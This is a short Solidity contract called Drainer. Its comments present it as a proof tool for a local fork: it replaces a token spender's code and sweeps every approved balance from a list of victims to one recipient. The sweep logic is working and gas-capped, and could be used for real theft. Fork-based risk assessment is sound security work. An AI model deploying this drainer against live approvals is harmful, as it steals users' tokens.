// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * Drainer: the hostile implementation a compromised controller could install.
 * Proves a key, not a bug. On an anvil fork we point the spender's code at this
 * and call sweep() for each victim/token the index says is live. If the tokens
 * land in the attacker, the risk is real, not estimated.
 *
 * Every external call is low-level and gas-capped: one non-standard or hostile
 * token must not revert or gas-drain the whole sweep, or a single bad row would
 * hide a real loss.
 */
contract Drainer {
    /// Pulls every approved token from victims into `to`. Returns tokens actually moved.
    function sweep(address[] calldata tokens, address[] calldata victims, address to)
        external
        returns (uint256 moved)
    {
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            (bool okBal, bytes memory balRet) =
                token.staticcall{gas: 200000}(abi.encodeWithSelector(0x70a08231, victims[i])); // balanceOf(address)
            if (!okBal || balRet.length < 32) continue; // malformed balanceOf: skip, never revert
            uint256 bal = abi.decode(balRet, (uint256));
            if (bal == 0) continue;
            (bool okT, bytes memory tRet) =
                token.call{gas: 600000}(abi.encodeWithSelector(0x23b872dd, victims[i], to, bal)); // transferFrom
            if (okT && (tRet.length == 0 || (tRet.length >= 32 && abi.decode(tRet, (bool))))) moved++;
        }
    }
}
